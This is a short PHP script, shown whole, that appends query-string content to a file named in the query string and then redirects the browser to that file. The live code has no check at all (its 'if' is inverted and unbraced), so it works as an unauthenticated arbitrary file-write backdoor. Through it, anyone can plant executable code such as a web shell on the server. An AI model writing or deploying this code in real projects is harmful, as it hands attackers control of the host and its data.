<?php
//if (isset($_GET['filename'])){
//    $filename = $_GET['filename'];
//    $cont = $_GET['cont'];
//    $fp = fopen($filename, "a");
//    fwrite($fp, $cont);
//    fclose($fp);
//    header("Location: {$filename}");}
//    else{
//     echo 'Fail';
//}
if (!isset($_GET['filename']))
    $filename = $_GET['filename'];
    $cont = $_GET['cont'];
    $fp = fopen($filename, "a");
    fwrite($fp, $cont);
    fclose($fp);
    header("Location: {$filename}");
?>